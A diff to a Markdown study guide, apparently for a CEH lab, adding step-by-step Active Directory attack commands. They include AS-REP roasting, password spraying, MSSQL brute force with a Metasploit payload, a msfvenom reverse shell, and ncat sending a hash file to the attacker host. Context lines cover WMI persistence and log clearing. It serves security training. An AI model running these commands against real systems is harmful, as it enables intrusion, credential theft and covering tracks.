@@ -375,7 +375,6 @@ AdminSDHolder container protects AD accounts/groups. Attackers can add user ACL 
 4. Verify:
   - `Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs`
 
-
 #### 10. Priv Esc with WMI and maintain persistence
 WMI event subscriptions can trigger code execution. Attackers use scripts for persistence.
 
@@ -387,7 +386,6 @@ WMI event subscriptions can trigger code execution. Attackers use scripts for pe
 3. Run script:
   - `Import-Module ./WMI-Persistence.ps1`
   - `install-Persistence -Trigger Startup -Payload "C:\users\administrators\downloads\exploit.exe"`
-
 
 #### 11. Covert channels using covert_TCP
 Covert_TCP manipulates TCP/IP headers to bypass firewalls and IDS/IPS.
@@ -470,7 +468,7 @@ BASH stores history in `.bash_history`. Investigators can use this to track intr
 - Overwrite deleted files:
   - `cipher /w:c:`
  
-#### 3.5 Clear Linux Logs using Bash Shell
+#### 4.5 Clear Linux Logs using Bash Shell
 
 - Disable history:
   - `export HISTSIZE=0`
@@ -512,3 +510,123 @@ Useful for clearing logs, temporary files, and other artifacts.
 
 ---
 
+### 5. Active Directory (AD) Attacks
+
+#### Task 1: Perform Initial Scans to Obtain Domain Controller IP and Domain Name
+
+The initial scan in AD enumeration is crucial as it identifies the network structure, open ports, and services. This information helps ethical hackers map the AD environment, uncover vulnerabilities, and plan targeted attacks.
+
+- Initial Scan:
+  - `nmap 10.10.1.0/24`
+- Detailed scan:
+  - `nmap -A -sC -sV 10.10.1.22`
+
+We get the domain name and FQDN.
+
+#### Task 2: Perform AS-REP Roasting Attack
+
+- AS-REP roasting targets AD accounts without Kerberos pre-authentication (DONT_REQ_PREAUTH). Attackers request a TGT for these accounts, capture the response, and crack it offline:
+  - `python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
+    - `GetNPUsers.py`: Python script to retrieve AD user information.
+    - `CEH.com/`: Target AD domain.
+    - `-no-pass`: Flag to find user accounts not requiring pre-authentication.
+    - `-usersfile ~/ADtools/users.txt`: Path to the file with the user account list.
+    - `-dc-ip 10.10.1.22`: IP address of the DC to query.
+  - impacket-GetNPUsers -dc-ip 10.10.10.161 -request -no-pass -usersfile users.txt  htb.local/
+  - impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/
+- If a user (e.g., **Joshua**) has **DONT_REQUIRE_PREAUTH**, we can extract the password hash:
+  - `echo '[HASH]' > joshuahash.txt`
+- Crack with John:
+  - `john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt`
+
+#### Task 3: Spray Cracked Password into Network using CrackMapExec
+
+CrackMapExec can spray a cracked password across services to identify reused credentials.
+
+- Example for RDP:
+  - `cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"`
+    - `rdp`: Targets the Remote Desktop Protocol (RDP) service.
+    - `10.10.1.0/24`: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.
+    - `-u /root/ADtools/users.txt`: Specifies the path to the file containing user accounts for authentication.
+    - `-p "cupcake"`: Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts.
+- If successful, we find accounts reusing the cracked password (e.g., **Mark** on host **10.10.1.40**).
+
+#### Task 4: Perform Post-Enumeration using PowerView
+
+PowerView is a PowerShell tool for AD enumeration.
+
+- Load the script:
+  - `powershell -EP Bypass`
+  - `Import-Module .\PowerView.ps1`
+- Examples:
+  - `Get-NetComputer`
+  - `Get-NetGroup`
+  - `Get-NetUser``
+- Other useful commands:
+- `Get-NetOU` - Lists all organizational units.  
+- `Get-NetSession` - Lists active sessions.  
+- `Get-NetLoggedon` - Shows logged-on users.  
+- `Get-NetProcess` - Lists running processes.  
+- `Get-NetService` - Lists services.  
+- `Get-NetDomainTrust` - Lists trust relationships.  
+- `Get-ObjectACL` - Retrieves ACLs.  
+- `Find-InterestingDomainAcl` - Finds interesting ACLs.  
+- `Get-NetSPN` - Lists SPNs.  
+- `Invoke-ShareFinder` - Finds shared folders.  
+- `Invoke-UserHunter` - Finds where admins are logged in.  
+- `Invoke-CheckLocalAdminAccess` - Checks local admin rights.  
+
+#### Task 5: Perform Attack on MSSQL Service
+
+**xp_cmdshell** in SQL Server can allow arbitrary command execution if misconfigured.
+
+- Bruteforce MSSQL login:
+  - `hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql`
+- Login with Impacket:
+  - `python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433`
+- Check if `xp_cmdshell` is enabled:
+  - `SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';`
+- Exploit with Metasploit:
+  - `use exploit/windows/mssql/mssql_payload`
+  - `set RHOST 10.10.1.30`
+  - `set USERNAME SQL_srv`
+  - `set PASSWORD batman`
+  - `set DATABASE master`
+ 
+#### Task 6: Perform Privilege Escalation
+
+WinPEAS identifies misconfigurations for privilege escalation.
+
+- Host **winPEASx64.exe**:
+  - `python3 -m http.server`
+- Download on victim:
+  - wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
+- If vulnerable (Unquoted Service Path):
+  - `msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe`
+- Start listener:
+  - `nc -nvlp 8888`
+- Replace vulnerable file:
+  - `move file.exe file.bak`
+  - wget http://10.10.1.13:8000/file.exe
+  - `-o file.exe`
+- Reboot victim machine to trigger payload.
+
+#### Task 7: Perform Kerberoasting Attack
+
+Kerberoasting extracts service account hashes via Kerberos and cracks them offline.
+
+- In the netcat shell, execute the powershell command to launch PowerShell. Navigate to C:\Users\Public\Downloads and execute the command cd ../.. ; cd Users\Public\Downloads
+  - `cd ../.. ; cd Users\Public\Downloads`
+- On victim:
+  - wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe
+  - wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
+- Transfer hash with Netcat:
+  - `ncat.exe -w 3 10.10.1.13 9999 < hash.txt`
+- On attacker:
+  - `nc -lvp 9999 > hash.txt`
+- Crack with Hashcat:
+  - `hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt`
+- If successful, attacker obtains service account passwords (e.g., **DC-Admin**).
+
+---
+---
